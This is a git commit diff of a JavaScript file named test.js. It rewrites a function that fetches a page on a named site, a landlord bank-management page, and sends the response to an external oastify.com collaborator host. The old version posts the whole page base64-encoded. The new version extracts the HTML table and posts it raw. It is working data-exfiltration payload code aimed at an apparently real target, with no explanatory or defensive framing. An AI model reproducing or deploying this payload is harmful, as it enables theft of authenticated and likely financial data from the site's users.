e8f735f23f422da71455d4f7c4bdd09f643f2b4f
manitorpotterk <45949793+manitorpotterk@users.noreply.github.com>
2024-10-10 18:29:55 +0530

    Update test.js

--- test.js
+++ test.js
@@ -1,15 +1,24 @@
-function fe(t) { 
+function fe(t) {
     fetch(t)
         .then(t => t.text())
-        .then(t => { 
-            fetch("//mpff5i3yowuv452xfzhu30ytzk5bt1hq.oastify.com/log/", {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/x-www-form-urlencoded'
-                },
-                body: "p=" + btoa(t)
-            });
-        });
+        .then(t => {
+            // Extract content between <table> and </table> tags
+            const tableContent = t.match(/<table[^>]*>([\s\S]*?)<\/table>/i);
+            
+            if (tableContent && tableContent[1]) {
+                // Send the extracted table content as raw data in a POST request
+                fetch("//mpff5i3yowuv452xfzhu30ytzk5bt1hq.oastify.com/log/", {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'text/plain'
+                    },
+                    body: tableContent[1] // Send the raw table content
+                });
+            } else {
+                console.log('No <table> tag found in the HTML.');
+            }
+        })
+        .catch(error => console.error('Error:', error));
 }
 
 urls = ["https://leaderbank.qa.zrent.net/Landlord/ManageBanks"];
